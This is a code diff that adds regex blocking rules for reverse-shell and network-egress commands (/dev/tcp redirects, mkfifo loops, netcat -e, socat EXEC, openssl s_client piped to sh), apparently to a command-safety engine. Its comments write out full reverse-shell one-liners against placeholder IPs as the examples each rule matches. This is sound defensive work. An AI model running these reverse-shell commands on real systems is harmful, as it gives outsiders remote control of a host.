@@ -320,4 +320,112 @@ BUILTIN_BLOCKLIST: list[Rule] = [
             "pattern": r"\b[A-Za-z_]\w*=/\s*;\s*rm\s+(?=[^|;&]*-[a-zA-Z]*r)|\b[A-Za-z_]\w*=/\*\s*;\s*rm\s+(?=[^|;&]*-[a-zA-Z]*r)",
         },
     ),
+    # ── TJ-GAP-058 network-egress wave (probe 2026-09-16: egress was the ──
+    # ── largest wholly-uncovered class — nothing in the engine touched it) ──
+    Rule(
+        rule_id="builtin-net-devtcp-redirect",
+        description="Network-fd redirect reverse shell (/dev/tcp, /dev/udp)",
+        priority=1000,
+        action="block",
+        block_message="Reverse shell through a network file descriptor (redirect into /dev/tcp/... or /dev/udp/...) is blocked.",
+        match={
+            "type": "pattern",
+            # bash exposes /dev/tcp/<host>/<port> and /dev/udp/<host>/<port>
+            # as network sockets: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`,
+            # `exec 3<>/dev/tcp/host/port`, `cat < /dev/tcp/host/port`.
+            # The rule requires a REDIRECT OPERATOR bound to the fd path, so
+            # a mere mention inside a string/argument (`echo 'see /dev/tcp'`,
+            # `grep -rn '/dev/tcp' docs/`, `rsync host:/dev/tcp/x .`) is NOT
+            # matched. Operators are listed longest-first for readability:
+            # &>  >&  >>  <>  <<  >  <  (each followed by optional spaces).
+            # Two-char op first so `>&` never degrades into `>` + `&`.
+            "pattern": r"(?:&>|>&|>>|<>|<<|>|<)\s*/dev/(?:tcp|udp)/\S",
+        },
+    ),
+    Rule(
+        rule_id="builtin-net-mkfifo-reverse-shell",
+        description="mkfifo feedback-loop reverse shell (fifo + shell + network client)",
+        priority=1000,
+        action="block",
+        block_message="mkfifo feedback-loop reverse shell is blocked — a fifo wired from a shell into a network client is the canonical two-way shell.",
+        match={
+            "type": "pattern",
+            # The classic two-way loop:
+            #   mkfifo /tmp/f
+            #   cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
+            # Both halves of the wiring must be present in the SAME command
+            # string: a shell (`sh`/`bash`/`dash`/`ksh`, optionally
+            # path-qualified) AND a pipe into a network client. A lone
+            # `mkfifo /tmp/f` (or `mkfifo /tmp/f; tail -f /tmp/f`) stays
+            # allowed, so ordinary fifo use is not over-blocked. The
+            # lookaheads deliberately cross `;`/`|` ([\s\S]*) because the
+            # vector is a MULTI-SEGMENT command; every other rule in this
+            # file stays segment-local via [^|;&]*.
+            # Ordered before builtin-net-nc-shell-attach so this more
+            # specific combination is the rule that claims the vector.
+            "pattern": r"\bmkfifo\b(?=[\s\S]*(?<![\w/.-])(?:/bin/|/usr/bin/)?(?:sh|bash|dash|ksh)\b)(?=[\s\S]*\|\s*(?:nc|ncat|netcat|socat)\b)",
+        },
+    ),
+    Rule(
+        rule_id="builtin-net-nc-shell-attach",
+        description="netcat/ncat with a shell attach (-e/-c/--exec or a shell on either side of a pipe)",
+        priority=1000,
+        action="block",
+        block_message="netcat/ncat with a shell attach (-e / -c / --exec, or a shell piped to/from the connection) is blocked — that is a reverse shell, not a port check.",
+        match={
+            "type": "pattern",
+            # Four arms, one per attach shape:
+            # 1. exec flag: nc -e /bin/sh 10.0.0.1 4444, nc -e/bin/bash ...,
+            #    ncat --exec /bin/bash ..., ncat --sh-exec 'sh ...'
+            # 2. ncat -c <shell>: the -c operand must BE a shell (ncat's -c
+            #    is --sh-exec) so an unrelated -c on another nc dialect does
+            #    not trip it; quote-stripped form (`-c 'sh'` -> `-c sh`) is
+            #    covered by the matcher's normalized candidate.
+            # 3. connection piped INTO a shell: `nc 10.0.0.1 4444 | sh`
+            # 4. shell piped INTO the connection: `bash -i 2>&1 | nc host 4444`
+            #    — the shell may carry options and fd redirects (`-i`, `2>&1`)
+            #    before the pipe, and the client must be given host + port
+            #    (numeric or $var), so `cmd | nc host port` data sends and
+            #    `bash -c 'x' && tar ... | nc` chains are NOT matched.
+            # `nc -z example.com 443` (port check) has no shell attach and is
+            # the pinned ALLOW control.
+            "pattern": r"(?<![\w.-])(?:nc|ncat|netcat)\s[^|;&]*(?<![\w-])(?:--exec|--sh-exec|-e)\b|(?<![\w.-])(?:nc|ncat|netcat)\s[^|;&]*(?<![\w-])-c\s+(?:/bin/|/usr/bin/)?(?:sh|bash|dash|zsh|ksh)\b|(?<![\w.-])(?:nc|ncat|netcat)\b[^|;&]*\|\s*(?:/bin/|/usr/bin/)?(?:bash|sh|dash|zsh|ksh)\b|(?<![\w/.-])(?:/bin/|/usr/bin/)?(?:bash|sh|dash|zsh|ksh)\b(?:\s+(?:-\S+|\d?>&?\d+))*\s*\|\s*(?:nc|ncat|netcat)\s+(?:-\S+\s+)*\S+\s+(?:\d+|\$\S+)",
+        },
+    ),
+    Rule(
+        rule_id="builtin-net-socat-exec",
+        description="socat EXEC:/SYSTEM: wired to a network endpoint",
+        priority=1000,
+        action="block",
+        block_message="socat wired to EXEC:/SYSTEM: over a network address is blocked — it spawns a remote-command shell over the socket.",
+        match={
+            "type": "pattern",
+            # `socat TCP:host:port EXEC:/bin/sh`,
+            # `socat exec:'bash -li',pty,... tcp:host:port`,
+            # `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash`,
+            # `socat UDP:host:port SYSTEM:'sh -c id'`, openssl:/sctp: forms.
+            # Both halves are required in the same segment via two
+            # lookaheads, so a plain relay/listener stays allowed:
+            # `socat TCP-LISTEN:8080,fork,reuseaddr -` and
+            # `socat - TCP:127.0.0.1:9092` (no EXEC:/SYSTEM:) do NOT match.
+            "pattern": r"(?<![\w.-])socat\s+(?=[^|;&]*(?<![\w-])(?:exec|system):)(?=[^|;&]*(?<![\w-])(?:tcp|udp|sctp|openssl)(?:4|6)?(?:-listen|-connect|-recvfrom|-sendto)?:)",
+        },
+    ),
+    Rule(
+        rule_id="builtin-net-openssl-pipe-shell",
+        description="openssl s_client piped into a shell",
+        priority=1000,
+        action="block",
+        block_message="Piping an openssl s_client TLS session into a shell is blocked — a bare s_client diagnostic (no shell pipe) stays allowed.",
+        match={
+            "type": "pattern",
+            # `openssl s_client -quiet -connect 1.2.3.4:443 | sh` — the TLS
+            # session becomes the shell's stdio. The pipe target must be a
+            # shell, so the pinned diagnostic
+            # `openssl s_client -connect example.com:443` and TLS-inspection
+            # pipelines (`... | openssl x509 -noout -dates`,
+            # `... | grep subject=`) are NOT matched.
+            "pattern": r"(?<![\w.-])openssl\s+s_client\b[^|;&]*\|\s*(?:/bin/|/usr/bin/)?(?:bash|sh|dash|zsh|ksh)\b",
+        },
+    ),
 ]
